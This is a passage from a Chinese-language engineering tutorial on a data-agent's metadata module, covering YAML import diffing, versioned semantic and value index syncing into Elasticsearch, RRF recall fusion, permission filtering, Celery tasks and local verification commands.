        imported_keys = set(imported)
        return ResourceChanges(
            created=sorted(imported_keys - existing_keys),
            updated=sorted(
                item_key
                for item_key in existing_keys & imported_keys
                if existing[item_key] != imported[item_key]
            ),
            deleted=(
                sorted(existing_keys - imported_keys)
                if mode is ImportMode.REPLACE
                else []
            ),
        )
```

集合运算表达三种变更：差集 = 新增，交集里快照不等 = 更新，反向差集 = 删除。**`deleted` 只在 REPLACE 模式产生**——MERGE 模式不动库里已有的东西。

**避免 N+1**：

```python
            target_column_names = [col.name for col in table_config.columns]
            # 同一张表一次取齐所有示例值，避免逐字段查询产生 N+1 开销和不同采样快照。
            table_column_samples = (
                await self._source_repo.get_table_columns_sample_values(
                    table_config.name,
                    target_column_names,
                    COLUMN_EXAMPLE_LIMIT,
                )
            )
```

两个理由：性能（45 张表 × 每表十几个字段 = 上千次查询）和**一致性**（逐字段查可能落在不同的数据快照上）。

**dry-run 提前返回**：

```python
        if dry_run:
            return result
```

计算完变更摘要就返回，不写库、不投递任务。后台管理页的「预览变更」就是这个模式。

**MERGE 模式的可用字段集合**：

```python
        available_columns = set(imported_columns)
        if mode is ImportMode.MERGE:
            available_columns.update(existing_columns)
        self._validate_column_references(column_infos, available_columns)
        self._validate_metric_columns(metric_infos, available_columns)
```

MERGE 模式下，新导入的字段可以引用「库里已有但本次 YAML 未声明」的字段——因为 MERGE 不会删掉库里的旧字段。

### 6.3.4 语义索引同步

**版本对齐机制**是这一节的核心。每个元数据记录有两个版本号：

| 字段 | 含义 | 谁改 |
| --- | --- | --- |
| `meta_version` | 元数据内容版本 | 元数据快照变化时 +1 |
| `index_version` | 索引同步到的版本 | 同步任务成功时写成目标版本 |

判断索引新鲜度：

```python
def _index_status(item: ColumnInfo | MetricInfo) -> SemanticIndexStatus:
    """根据元数据和索引版本判断索引状态。"""
    if item.index_version <= 0:
        return "missing"
    if item.index_version < item.meta_version:
        return "stale"
    return "current"
```

三态：`missing`（从没同步过）、`stale`（同步过但元数据又变了）、`current`（一致）。

**为什么需要两套版本**：索引同步是异步的。同步期间元数据可能又被改了。如果同步任务结束时无条件把 `index_version` 写成它开始时的 `meta_version`，就会把过期内容标记成「已同步」。

**乐观提交**：

```python
    async def mark_column_indexed_if_current(
        self,
        t_name: str,
        c_name: str,
        target_version: int,
    ) -> bool:
        """元数据版本未变化时确认字段语义索引版本。"""
        result = await self._session.execute(
            update(ColumnInfo)
            .where(
                ColumnInfo.t_name == t_name,
                ColumnInfo.name == c_name,
                ColumnInfo.meta_version == target_version,
            )
            .values(index_version=target_version)
            .returning(ColumnInfo.name)
        )
        return result.scalar_one_or_none() is not None
```

**关键在 `where` 里的 `meta_version == target_version`**：只有「当前版本还是我同步的那个版本」才提交。如果同步期间元数据变了（`meta_version` 已经大于 `target_version`），UPDATE 影响 0 行，返回 `False`，索引保持 `stale` 状态，等下一轮同步。

这是**乐观并发控制**（optimistic concurrency）的标准做法——不加锁，用条件更新检测冲突。

**同步入口用 advisory lock + 短事务**：

```python
    async def sync_column_indexes(
        self,
        column_keys: list[ColumnKey],
    ) -> dict[ColumnKey, SemanticIndexSyncResult]:
        """差量同步多个字段的语义索引。"""
        results: dict[ColumnKey, SemanticIndexSyncResult] = {}
        for t_name, c_name in dict.fromkeys(column_keys):
            resource_key = column_resource_key(t_name, c_name)
            async with self._meta_repo.session.begin():
                await self._meta_repo.acquire_index_lock("column", resource_key)
                column_info = await self._meta_repo.get_column_info(t_name, c_name)
                result = await self._sync_column_index(column_info)
                committed = await self._meta_repo.mark_column_indexed_if_current(
                    t_name,
                    c_name,
                    result.target_version,
                )
            results[(t_name, c_name)] = replace(
                result,
                version_committed=committed,
            )
        return results
```

`dict.fromkeys(column_keys)` 用来**去重同时保序**。`replace(result, ...)` 是 dataclass 的不可变更新。

**资源级 advisory lock**：

```python
    async def acquire_index_lock(self, resource_type: str, resource_key: str) -> None:
        """在当前事务中获取索引资源级互斥锁。"""
        await self._session.execute(
            text("SELECT pg_advisory_xact_lock(hashtextextended(:lock_key, 0))"),
            {"lock_key": f"metadata-index:{resource_type}:{resource_key}"},
        )
```

注意用的是 `pg_advisory_xact_lock`（**事务级**，不是连接级）——事务提交或回滚时自动释放，不需要显式解锁。锁粒度是「单个资源」（一个字段或一个指标），所以不同字段可以并发同步。

`hashtextextended` 是 PG 内置的哈希函数，比在应用层算 sha256 更省事。

**差量计算：只对必要的文档重算向量**：

```python
        for target in targets:
            existing = current_by_id.get(target.id)
            if existing is None:
                embedding_targets.append(("create", len(create), target))
                create.append(target)
                continue
            needs_embedding = (
                existing.text != target.text
                or existing.embedding_revision != target.embedding_revision
            )
            changed = needs_embedding or any(
                (
                    existing.resource_key != target.resource_key,
                    existing.text_type != target.text_type,
                    existing.meta_version != target.meta_version,
                    existing.payload_hash != target.payload_hash,
                )
            )
            if not changed:
                unchanged_count += 1
                continue
            if needs_embedding:
                embedding_targets.append(("update", len(update), target))
            update.append(target)
```

`needs_embedding` 只看两件事：**文本变了**，或者**向量模型版本变了**。其余字段（`meta_version`、`payload_hash`）变化只需要更新 payload，向量可以复用。

```python
        if embedding_targets:
            # 批量嵌入只覆盖新增或正文/模型版本变化的文档，payload-only 更新复用旧向量。
            embeddings = await self._embed_texts(
                [target.text for _, _, target in embedding_targets]
            )
            for (operation, index, target), embedding in zip(
                embedding_targets,
                embeddings,
                strict=True,
            ):
                embedded = replace(target, embedding=embedding)
                if operation == "create":
                    create[index] = embedded
                else:
                    update[index] = embedded
```

**这是省钱的关键**。调用 embedding API 是**按 token 计费**的。一个字段有 3 类文本（name / description / alias），45 张表 × 平均 20 字段 × 3 = 2700 次嵌入。如果每次改描述就全量重算，成本会很难看。

**文本规范化 + 稳定 ID**：

```python
        for text_value, text_type in source_texts:
            canonical = unicodedata.normalize("NFC", text_value).strip()
            if canonical:
                entries.setdefault(canonical, text_type)
        payload_hash = hashlib.sha256(
            json.dumps(
                payload,
                ensure_ascii=False,
                sort_keys=True,
                separators=(",", ":"),
            ).encode()
        ).hexdigest()
        embedding_revision = self._embedding_revision()
        return [
            SemanticIndexDocument(
                id=str(
                    uuid.uuid5(
                        uuid.NAMESPACE_URL,
                        json.dumps(
                            [resource_type, resource_key, text_value],
                            ensure_ascii=False,
                            separators=(",", ":"),
                        ),
                    )
                ),
```

三个要点：

1. **NFC 规范化**。中文里同一个字可能有多种 Unicode 编码（组合字符 vs 预组合字符）。不规范化的话，「e + ́」和「é」会被当成两个不同的文本，产生重复文档。
2. **`entries.setdefault` 去重**。同一个文本在 name 和 alias 里都出现时只保留第一次的类型。
3. **uuid5 生成稳定 ID**。`uuid5(NAMESPACE_URL, [resource_type, resource_key, text_value])`——**同样的资源 + 同样的文本永远得到同样的 ID**。这让 ES 的写入天然幂等：重复同步不会产生重复文档。

**`payload_hash` 用 `sort_keys=True` + 紧凑分隔符**。dict 的键顺序在 Python 3.7+ 是插入顺序，如果构造顺序变了哈希就会变，误判成「内容变了」。排序键消除这个不确定性。

**`embedding_revision` 的构成**：

```python
    def _embedding_revision() -> str:
        """生成当前嵌入模型和预处理规则版本。"""
        return (
            f"openai-compatible:{cfg.embedding.model}:"
            f"{cfg.elasticsearch.embedding_size}:{_SEMANTIC_PREPROCESS_VERSION}"
        )
```

它把模型名 + `embedding_size` + 预处理版本拼在一起。**换模型或改维度会让所有文档的 `embedding_revision` 变化**，从而触发全量重算向量。这是必须的——不同模型的向量空间不可比，混用会让检索结果完全错乱。

### 6.3.5 取值索引：代次与水位的状态机

取值索引是四层结构里最复杂的一块。它的目标是：**让「华东区」这种值也能被检索到**。

**问题**：字段的取值可能很多（一个地区字段有几十个值），而且会变。全量重刷慢，增量同步又要处理乱序和延迟写入。

**做法：全量用代次（generation），增量用固定上界 + 回看窗口。**

**运行所有权登记**：

```python
    async def _begin_value_index_run(
        self,
        t_name: str,
        c_name: str,
        *,
        requested_mode: RequestedValueIndexSyncMode,
    ) -> _ValueIndexRun:
        """在短事务中校验配置并登记运行所有权。"""
        run_id = uuid.uuid4()
        started_at = datetime.now(UTC)
        async with self._meta_repo.session.begin():
            await self._meta_repo.acquire_index_lock(
                "value",
                column_resource_key(t_name, c_name),
            )
            column_info = await self._meta_repo.get_column_info(t_name, c_name)
            table_info = await self._meta_repo.get_table_info(t_name)
            cursor_column = table_info.value_index_cursor_column
            state = column_info.value_index_state
            if (
                state is not None
                and state.status == "syncing"
                and state.active_run_id is not None
            ):
                raise RuntimeError("字段取值索引已有运行中的同步任务")
            if column_info.index_values:
                mode: ValueIndexSyncMode = self._select_value_sync_mode(
                    cursor_column,
                    state,
                    requested_mode=requested_mode,
                )
                generation = (
                    uuid.uuid4()
                    if mode == "full"
                    else state.current_generation
                    if state is not None
                    else None
                )
                if generation is None:
                    mode = "full"
                    generation = uuid.uuid4()
            else:
                mode = "clear"
                generation = None
```

三种模式：

| 模式 | 触发条件 | 行为 |
| --- | --- | --- |
| `full` | 首次同步，或没有游标列 | 读全量取值，写新代次，删旧代次 |
| `incremental` | 有游标列且已有代次 | 只读游标之后变化的取值 |
| `clear` | `index_values=False` | 删掉这个字段的全部取值索引 |

**`active_run_id` 是并发保护**。同一字段不允许两个同步任务同时跑（会互相覆盖代次）。检查放在 advisory lock 保护的短事务里，所以检查+写入是原子的。

**增量同步的水位**：

```python
        upper_bound = await self._source_repo.get_value_sync_upper_bound(
            run.t_name,
            run.cursor_column,
        )
        if upper_bound is None:
            return ValueIndexSyncResult(
                mode="incremental",
                read_value_count=0,
                upserted_count=0,
                removed_count=0,
                cursor_value=run.cursor_value,
                sync_generation=str(run.generation),
            )
        previous_cursor = self._deserialize_cursor(run.cursor_value)
        lower_bound = self._lookback_lower_bound(
            previous_cursor,
            cfg.metadata_index.value_lookback_seconds,
        )
        read_count = await self._upsert_value_batches(
            self._source_repo.iter_changed_column_value_batches(
                run.t_name,
                run.c_name,
                run.cursor_column,
                lower_bound,
                upper_bound,
            ),
            run.t_name,
            run.c_name,
            run.generation,
        )
```

**「固定上界 + 回看窗口」是处理乱序写入的标准手段**：

```
上次同步水位 = T0
本次读取范围 = [T0 - 300秒, T1]
                                  ↑ 上界在开始时固定，同步过程中新写入的数据留到下次
                    ↑ 回看 300 秒，覆盖「写入时间 < T0 但实际提交时间 > T0」的迟到数据
```

回看窗口的大小由配置控制：

```yaml
metadata_index: # 元数据索引同步策略。
  value_lookback_seconds: 300 # 增量取值索引同步的回看窗口，单位为秒。
```

**为什么上界要固定**：如果边读边把上界往前推，数据量大的时候可能永远读不完（新数据一直在产生）。固定上界保证这次同步一定会结束。

**代价**：增量同步**只 upsert 不删除**。被删掉的取值只能等下一次全量同步清理（全量用代次标记删除）。

**游标的类型保真**：

```python
    @staticmethod
    def _serialize_cursor(value: Any) -> dict[str, object]:
        """将 Doris 类型化游标转换为 JSON 状态。"""
        if isinstance(value, datetime):
            return {"type": "datetime", "value": value.isoformat()}
        if isinstance(value, date):
            return {"type": "date", "value": value.isoformat()}
        if isinstance(value, Decimal):
            return {"type": "decimal", "value": str(value)}
```

游标列可能是 `datetime` / `date` / `decimal` / `bool` / `int` / `float` / `str`。存成 JSON 时必须带类型信息，否则 `datetime` 会变成字符串，下次比较时类型不匹配。

`_lookback_lower_bound` 对 `date` 类型把秒数向上取整成天——因为 `date` 类型没有时分秒，回看 300 秒等价于回看 1 天。

**终态校验**：

```python
    async def _complete_value_index_run(...) -> bool:
```

提交水位前会重新读一遍元数据，比对 `column_meta_version` / `table_meta_version` / `cursor_column` / `index_values`。任一变化就抛 `RuntimeError("字段取值索引同步配置已变化")`，**宁可失败也不写脏数据**。

**代次清理**：

```python
    async def delete_other_generations(
        self,
        t_name: str,
        c_name: str,
        generation: str,
    ) -> int:
        """删除字段下未进入当前全量同步代次的取值。"""
        if not await self._client.indices.exists(index=self._index_name):
            return 0
        result = await self._client.delete_by_query(
            index=self._index_name,
            query={
                "bool": {
                    "filter": [self._resource_query(t_name, c_name)],
                    "must_not": [
                        {"term": {"sync_generation": generation}},
                    ],
                }
            },
            conflicts="proceed",
            refresh=True,
        )
        return self._deleted_count(result)
```

**代次的用法**：全量同步时先给所有写入的文档打上**新**代次标记，同步完成后再删除「代次不是新的」文档。这样在同步过程中新旧数据并存也不会出错——旧数据还在，但新数据已经在；同步结束的清理动作把旧的删掉。

**为什么不能先删后写**：那样在同步过程中会出现「这个字段一个取值都没有」的窗口期，正好有查询命中就会召回不到。

`conflicts="proceed"` 是并发冲突时继续，`refresh=True` 是写完立即刷新（否则 ES 的 near-real-time 特性会让刚写的文档查不到）。

### 6.3.6 ES 索引结构

`app/metadata/repositories/semantic_index.py` 定义 mapping。三个字段的 boost 权重：

```python
_EXACT_TEXT_BOOSTS: dict[SemanticTextType, float] = {
    "name": 8.0,
    "alias": 6.0,
    "description": 4.0,
}
```

**字段名的精确命中权重最高**（8.0），别名次之（6.0），描述最低（4.0）。这符合实际——用户说「GMV」时，字段名或别名里直接有「GMV」的比描述里提到 GMV 的更相关。

向量字段配置：

```python
        "embedding": {
            "type": "dense_vector",
            "dims": cfg.elasticsearch.embedding_size,
            "index": True,
            "similarity": "cosine",
            "index_options": {"type": "hnsw"},
        },
        "payload": {"type": "object", "enabled": False},
    }
```

- `dims` 必须与模型输出维度一致（`BAAI/bge-m3` 是 1024）。
- `similarity: cosine` 是余弦相似度，适合文本向量。
- `index_options: {"type": "hnsw"}` 是近似最近邻索引。**这是必须的**——暴力计算 1024 维向量的余弦相似度在几千个文档上还行，几万个就慢了。HNSW 用图索引把复杂度从 O(n) 降到 O(log n)，代价是结果近似（不保证 100% 召回最优）。
- `payload: {"enabled": False}` 表示 payload 只存不索引。它用来在召回后还原完整元数据对象，不需要被检索。

**索引升级只补可安全新增的字段**：

```python
    async def ensure_index(self) -> None:
        """确保语义索引存在并补充可安全升级的字段。"""
        if await self._client.indices.exists(index=self._index_name):
            await self._client.indices.put_mapping(
                index=self._index_name,
                properties=_UPDATABLE_MAPPING_PROPERTIES,
            )
            return
        await self._client.indices.create(
            index=self._index_name,
            mappings=self._mappings,
        )
```

```python
_UPDATABLE_MAPPING_PROPERTIES: dict[str, Any] = {
    "resource_key": {"type": "keyword"},
    "meta_version": {"type": "long"},
    "embedding_revision": {"type": "keyword"},
    "payload_hash": {"type": "keyword"},
}
```

**ES 的 mapping 大部分字段是「只能建索引时设定，之后不能改」的**。改 `dims` 或改分词器必须重建索引。但新增一个字段是允许的，所以这里把「可以安全新增」的字段单独列出来，索引已存在时只补这几个。

**全文检索的 dis_max 组合**：

```python
        text_query: dict[str, Any] = {
            "dis_max": {
                "queries": [
                    *exact_queries,
                    {"match_phrase": {"text": {"query": query, "boost": 2.0}}},
                    {"match": {"text": query}},
                ]
            }
        }
```

`dis_max` 取**子查询中的最高分**而不是求和。三个子查询：

1. 精确 term 查询（带 boost）——整段文本完全等于检索词的命中。
2. `match_phrase`——短语连续出现的命中（boost 2.0）。比普通 match 严格，能避免「华 东 区」被拆散后误命中。
3. `match`——分词后的任意词命中。

用 `dis_max` 而不是 `bool.should` 求和，是为了**避免「三个子查询都命中同一个文档」时分数被叠加得过高**，盖过真正更相关的文档。

**差量写入的 partial update vs 整条覆盖**：

```python
        for document in delta.update:
            if document.embedding is None:
                # 文本未变化时使用 partial update，保留 Elasticsearch 中已有向量。
                actions.append(
                    (
                        {"update": {"_index": self._index_name, "_id": document.id}},
                        {
                            "doc": self._document_source(
                                document,
                                include_embedding=False,
                            )
                        },
                    )
                )
            else:
                # 文本或 embedding revision 变化时整条覆盖，确保向量与正文同版本。
                actions.append(
                    (
                        {"index": {"_index": self._index_name, "_id": document.id}},
                        self._document_source(document, include_embedding=True),
                    )
                )
```

**这是前面「payload-only 更新复用旧向量」在 ES 侧的落地**。如果按 `index`（整条覆盖）写入但不带 `embedding`，ES 会把向量字段清空。所以 payload-only 的更新必须用 `update` + `doc`（partial update），只改指定字段。

**损坏文档的容错**：

```python
                text_type_value = source.get("text_type")
                if text_type_value not in {"name", "description", "alias"}:
                    raise ValueError("语义文档 text_type 无效")
                payload = source.get("payload")
                if not isinstance(payload, dict):
                    raise TypeError("语义文档 payload 必须为对象")
```

读取时逐字段做类型校验。发现损坏文档时抛 `CorruptedSemanticIndexDocumentError`，上层会**先删掉这个资源的全部文档再返回空**，触发一次完整重建。这比「跳过损坏文档」更安全——跳过会导致召回结果不完整，而且用户不知道。

### 6.3.7 多路召回与 RRF 融合

**上下文对象承载整个召回过程的状态**（`_RecallContext`）：

```python
    def record_backend_failure(
        self,
        backend_name: str,
        error: BaseException,
        *,
        resource_type: SemanticResourceType,
        channel: Literal["fulltext", "vector"],
        term: str | None = None,
    ) -> None:
        """记录检索失败范围并保留任务取消语义。"""
        if isinstance(error, asyncio.CancelledError):
            raise error
        if not isinstance(error, Exception):
            raise error
```

**两个 re-raise 是关键**：

- `asyncio.CancelledError` 必须重新抛出。它继承自 `BaseException` 而不是 `Exception`，如果被当成「普通检索失败」吞掉，任务取消就失效了。
- 非 `Exception` 的 `BaseException`（比如 `KeyboardInterrupt`）也要抛出，不能被业务降级逻辑掩盖。

**向量通道的失败降级**：

```python
        try:
            embeddings = await self._embedding_client.aembed_documents(
                context.request.terms
            )
        except asyncio.CancelledError:
            raise
        except Exception as exc:  # noqa: BLE001
            if context.selects_any("column") and context.catalog.columns:
                context.record_backend_failure(
                    "向量生成",
                    exc,
                    resource_type="column",
                    channel="vector",
                )
            if context.selects_any("metric") and context.catalog.metrics:
                context.record_backend_failure(
                    "向量生成",
                    exc,
                    resource_type="metric",
                    channel="vector",
                )
            return
```

**embedding 服务挂了不影响全文召回**。失败被记录进 `failures`，响应状态变成 `partial`，但全文通道的结果照常返回。这是多路冗余设计的价值。

**候选累加与命中依据**：

```python
        for term, result in zip(context.request.terms, results, strict=True):
            if isinstance(result, BaseException):
                context.record_backend_failure(
                    backend_name,
                    result,
                    resource_type="column",
                    channel=match_type,
                    term=term,
                )
                continue
            seen_keys: set[ColumnKey] = set()
            for rank, hit in enumerate(result, start=1):
                key = (hit.item.t_name, hit.item.name)
                if key not in context.catalog.columns or key in seen_keys:
                    continue
                seen_keys.add(key)
                self._add_candidate_score(
                    context.column_scores,
                    key,
                    self._rrf_score(rank),
                    SemanticMatchReason(
                        match_type=match_type,
                        term=term,
                        score=hit.score,
                    ),
                )
```

注意 `if key not in context.catalog.columns` —— **权限过滤后的目录之外的结果直接丢弃**。这是「双保险」的第二道（第一道是查询时传白名单 filter）。

`SemanticMatchReason` 记录了「因为哪个词、在哪条通道、原始分数多少」，会随响应返回。这让模型知道「为什么这个字段被推荐」，也让管理员能排查召回质量问题。

**归一化**：

```python
        ordered = sorted(
            scores.items(),
            key=lambda item: (-item[1].score, str(item[0])),
        )
        if not ordered:
            return [], False
        max_score = ordered[0][1].score
        ranked = [
            (
                key,
                round(candidate.score / max_score, 6),
                candidate.reasons,
            )
            for key, candidate in ordered[:limit]
        ]
        return ranked, len(ordered) > limit
```

**排序键 `(-score, str(key))` 的第二项很重要**：分数相同时按资源键字符串排序，保证**结果稳定**。不稳定的排序会让同样的查询在不同次返回不同顺序，前端展示会跳，而且难以复现问题。

归一化到 [0,1] 是「类型内相对值」——每类召回结果的最高分是 1.0。这意味着**跨类型不可比**（字段的 0.8 和指标的 0.8 不是一回事）。代码里没有做跨类型比较，各类分别取 top-N。

**扩召再截断**：

```python
    @property
    def search_limit(self) -> int:
        """计算索引层候选扩召数量。"""
        return min(
            60,
            self.request.limit_per_type * _INDEX_SEARCH_LIMIT_MULTIPLIER,
        )
```

索引层召回 3 倍候选，融合后再截断到 `limit_per_type`。因为 RRF 融合会改变排序——一个在全文里排第 5、在向量里排第 3 的候选，融合后可能超过只在单通道排第 1 的候选。只召 `limit_per_type` 条的话，融合就没有意义了。

### 6.3.8 召回快照：query 主键与累积合并

**合并多份快照**：

```python
def _merge_semantic_recall_responses(
    recall_id: str,
    responses: list[SemanticResourceRecallResponse],
    *,
    refresh_request: SemanticResourceRecallRequest | None = None,
) -> SemanticResourceRecallResponse:
    """生成多个召回结果的去重合并快照。"""
    if len(responses) < 2:
        raise ValueError("至少需要两个召回响应")
    failures = _merge_failures(responses, refresh_request)
    return SemanticResourceRecallResponse(
        status="partial" if failures else "success",
        recall_id=recall_id,
        terms=_stable_union([response.terms for response in responses]),
        metrics=_merge_metrics(responses),
        columns=_merge_columns(responses),
        values=_merge_values(responses),
        tables=_merge_tables(responses),
        failures=failures,
        warnings=_stable_union([response.warnings for response in responses]),
        truncated=any(response.truncated for response in responses),
    )
```

`_stable_union` 是「去重 + 保序」的并集。**保序很重要**——顺序变化会让模型上下文的内容不稳定，影响 prompt cache 命中，也让调试变难。

**记录（累积）**：

```python
    async def record(
        self,
        user_id: int,
        conversation_id: UUID,
        query: str,
        request: SemanticResourceRecallRequest,
        response: SemanticResourceRecallResponse,
        query_experiences: list[QueryExperienceRecallResult],
        query_experiences_retrieved_at: datetime,
    ) -> SemanticRecallRecord:
        """将一次检索结果增量合入 query 的持续上下文。"""
        await self._repo.acquire_query_lock(user_id, conversation_id, query)
        previous = await self._repo.get_latest_by_query(
            user_id,
            conversation_id,
            query,
        )
        if previous is not None:
            previous = self._authorize_record(previous)
            response = _merge_semantic_recall_responses(
                response.recall_id,
                [previous.response, response],
                refresh_request=request,
            )
        # 每次追加都会写入新快照；query 的创建时间跨快照保持不变，更新时间决定最新版本。
        now = datetime.now(UTC)
```

**每次召回都追加一条新快照**，而不是原地更新。这样：
- 保留了历史（能看出模型分几次、用什么词召回了什么）；
- 读取时按「更新时间最大的那条」取最新；
- `created_at` 跨快照保持不变，代表这个 query 上下文的诞生时间。

**写入前先过滤权限**：

```python
            previous = self._authorize_record(previous)
```

**存的是已脱敏副本**。这样即使后来权限变了，库里也不会留下越权数据的痕迹。

**批量删除时固定顺序取锁**：

```python
        loaded: list[tuple[SemanticRecallResourceDeletion, SemanticRecallRecord]] = []
        missing: list[str] = []
        # 固定顺序取得全部 query 锁，避免两个批量删除以相反顺序等待而死锁。
        for query in sorted(deletion.query for deletion in deletions):
            await self._repo.acquire_query_lock(user_id, conversation_id, query)
```

**这是防死锁的标准手法**。如果两个请求分别要锁 [A, B] 和 [B, A]，不加排序就会互相等待。统一按字典序取锁，A 和 B 的顺序一致，就不会成环。

**查询经验缓存**：

```python
_QUERY_EXPERIENCE_CACHE_TTL = timedelta(days=1)
```

缓存有效期 1 天，且校验 `role_name` + `authorization_epoch`：

```python
    async def get_fresh_query_experiences(
        self,
        user_id: int,
        conversation_id: UUID,
        query: str,
    ) -> tuple[list[QueryExperienceRecallResult], datetime] | None:
        """读取仍在有效期且授权代次一致的查询经验缓存。"""
```

**授权代次变化即视为缓存失效**。这是 `authorization_epoch` 的第二个用途（第一个是让 Doris 连接池失效）。

### 6.3.9 权限过滤

`MetadataAuthorizationFilter` 不只过滤「能不能看见」，还要**清掉引用关系**：

- 移除未授权的主键名；
- 移除指向未授权资产的外键；
- 删掉指向被过滤资产的告警。

**为什么必须清引用**：如果表 A 可见、表 B 不可见，而 A 的某个字段有外键指向 B，那「A.x 引用 B.y」这条信息就泄漏了 B 的存在。所以过滤时要把这个外键字段的 `reference_t_name` / `reference_c_name` 置空。

**双保险的完整形态**：

```
第 1 道：_create_context 阶段把 catalog 裁剪为可见集合
         （模型能看到的目录里就没有无权资产）
第 2 道：召回查询传 allowed_columns / allowed_metrics 白名单 filter
         （ES 层面就不返回无权文档）
第 3 道：命中结果回来后再检查 key 是否在裁剪后的 catalog 里
         （兜底，防止 filter 逻辑有漏）
```

### 6.3.10 API 与 Celery 任务

**API 路由**（`app/metadata/api/meta/router.py`）里值得注意的两点：

**YAML 加载的三类错误分开处理**：

```python
def _load_yaml(...):
    """读取并校验元数据 YAML 文档。"""
```

区分 `UnicodeDecodeError`（不是 UTF-8）、`YAMLError`（YAML 语法错）、`PydanticValidationError`（字段不符合模型），给客户端返回不同的错误详情。这样用户上传错文件时能立刻知道错在哪。

**所有写接口都要管理员权限**（`AdminUserDep`），读接口要登录。

**导出用 `sort_keys=False`**：

```python
    content = yaml.safe_dump(
        meta_config.model_dump(mode="json", exclude_none=True),
        allow_unicode=True,
        sort_keys=False,
    )
    return Response(
        content=content,
```

`allow_unicode=True` 让中文直接输出而不是转成 `\uXXXX`（导出的 YAML 人可读）。`sort_keys=False` 保持声明顺序（表按 YAML 里的顺序，字段也按顺序），便于 diff。

**7 个 Celery 任务**：

| 任务名 | 干什么 | 队列 |
| --- | --- | --- |
| `dataagent.metadata.import` | 执行 YAML 导入 | metadata-index |
| `dataagent.metadata.sync_table_indexes` | 同步一张表下所有字段的语义索引 | metadata-index |
| `dataagent.metadata.sync_column_indexes` | 同步指定字段的语义索引 | metadata-index |
| `dataagent.metadata.sync_metric_indexes` | 同步指定指标的语义索引 | metadata-index |
| `dataagent.metadata.sync_table_values` | 同步一张表下所有字段的取值索引 | metadata-index |
| `dataagent.metadata.sync_column_values` | 同步指定字段的取值索引 | metadata-index |
| `dataagent.metadata.dispatch_value_indexes` | Beat 触发：领取到期字段并投递 | metadata-index |

**所有任务都先统一初始化四类客户端**：

```python
async def _run_with_metadata_resources[T](
    operation: Callable[[...], Awaitable[T]],
) -> T:
    """初始化元数据任务所需的全部客户端并执行操作。"""
```

这个模式和 4.8.6 里讲的 `_run_with_lifecycle_service` 一样——Worker 进程自己建资源、自己关。

**每日取值索引调度**：

```python
async def _dispatch_value_indexes() -> dict[str, int]:
    """提交到达每日执行时间的字段取值增量同步任务。"""
    now = datetime.now(UTC)
    stale_before = now - timedelta(seconds=cfg.task_queue.task_time_limit_seconds + 300)
```

它按 `_PERIODIC_BATCH_SIZE = 50` 循环领取，每次领取都要过 advisory lock（`acquire_index_lock("scheduler", "value-index-dispatch")`）——这样多个 Beat/Worker 实例不会重复领取同一批字段。

**为什么用「领取」而不是「查询」**：领取时会把字段状态改成 `syncing` 并记录 `active_run_id`。这样即使投递失败，下次扫描也不会重复投递同一个字段（状态是 `syncing` 而非 `pending`）。

投递失败时要**回滚领取状态**：

```python
            except Exception as exc:
                async with (
                    meta_postgres_client_manager.session() as session,
                    session.begin(),
                ):
                    await MetaPGRepo(session).fail_value_index_claims(
                        values,
                        error=f"{type(exc).__name__}: {exc}",
                        failed_at=datetime.now(UTC),
```

否则那些字段会永远卡在 `syncing` 状态。

## 6.4 测试

**没有单元测试目录**。这个模块强依赖 PostgreSQL + Doris + Elasticsearch + embedding 服务，脱离环境跑不起来。

### 6.4.1 端到端验证路径

```bash
# 1. 启动依赖与后端（Worker 必须运行，否则索引任务不执行）
docker compose -f docker/compose.yml up -d
make init-db
make run          # 终端 1
make worker       # 终端 2
make beat         # 终端 3
```

预期：`make run` 打印「应用资源初始化完成」；`http://127.0.0.1:7000/docs` 能看到 `/api/v1/meta/*` 全部接口。

### 6.4.2 导入元数据（dry-run 先看变更）

```bash
# 拿管理员 token
TOKEN=$(curl -s -X POST http://127.0.0.1:7000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"identifier":"admin","password":"<ADMIN_PASSWORD>"}' | \
  python -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# dry-run：只预览变更，不写库、不投递任务
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -F "file=@conf/meta_config.yaml" \
  "http://127.0.0.1:7000/api/v1/meta/import?mode=merge&dry_run=true"
```

预期：返回 JSON，含 `mode` / `dry_run` / `tables` / `columns` / `metrics`，每类下有 `created` / `updated` / `deleted` 的计数与主键列表。首次导入时 `created` 是 45 和 114，`updated` / `deleted` 都是空。

### 6.4.3 真实导入

```bash
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -F "file=@conf/meta_config.yaml" \
  "http://127.0.0.1:7000/api/v1/meta/import?mode=merge"
```

预期：返回 `{"task_id": "..."}`（202）。Worker 日志出现「元数据导入任务完成」。

### 6.4.4 验证索引同步

```bash
# 查 ES 索引是否存在且有文档
curl -s "http://127.0.0.1:9200/_cat/indices/data-agent-*?v"

# 看字段索引里的文档数量
curl -s "http://127.0.0.1:9200/data-agent-column/_count"
```

预期：`data-agent-column` / `data-agent-metric` 存在，`docs.count` 明显大于 0（45 张表的字段 × 每个字段 1~3 条文本）。

在 `meta` 库里对账版本状态：

```bash
docker exec -it postgres psql -U atguigu -d meta -c \
  "SELECT t_name, name, meta_version, index_version FROM column_info
   WHERE index_version < meta_version LIMIT 10;"
```

预期：**空结果**。如果还有行，说明同步没跑完（等 Worker）或失败了（看 Worker 日志）。

### 6.4.5 单独验证召回逻辑

召回链路不是 HTTP 接口，只能通过对话触发。但可以**在 Python 里直接调服务**验证融合算法：

```bash
uv run python -c "
from app.metadata.services.search import SemanticResourceRecallService
print('RRF(1) =', SemanticResourceRecallService._rrf_score(1))
print('RRF(2) =', SemanticResourceRecallService._rrf_score(2))
print('RRF(3) =', SemanticResourceRecallService._rrf_score(3))
"
```

预期输出：

```
RRF(1) = 0.01639344262295082
RRF(2) = 0.016129032258064516
RRF(3) = 0.015873015873015872
```

`_RRF_K = 60`，所以 `1/(60+1) ≈ 0.016393`。这三个数的**衰减很慢**（排名 1 和排名 3 只差 3%），这正是 RRF 的特点——它温和地加权，不让单通道的排名第一压倒一切。

### 6.4.6 验证召回快照

导入并同步索引后，在对话里问一个涉及取数的问题（会触发 Explorer 的 `recall_context`），然后查快照表：

```bash
docker exec -it postgres psql -U atguigu -d meta -c \
  "SELECT user_id, conversation_id, query, created_at, updated_at
   FROM semantic_recall_snapshot ORDER BY updated_at DESC LIMIT 5;"
```

预期：能看到 `query` 是模型填的业务问题（比如「最近30天各品类销售额」）。**同一个 query 多次召回时，`created_at` 不变、`updated_at` 递增**——这是累积合并生效的直接证据。

---

# 7. 安全查询链路（query）

## 7.1 需求说明

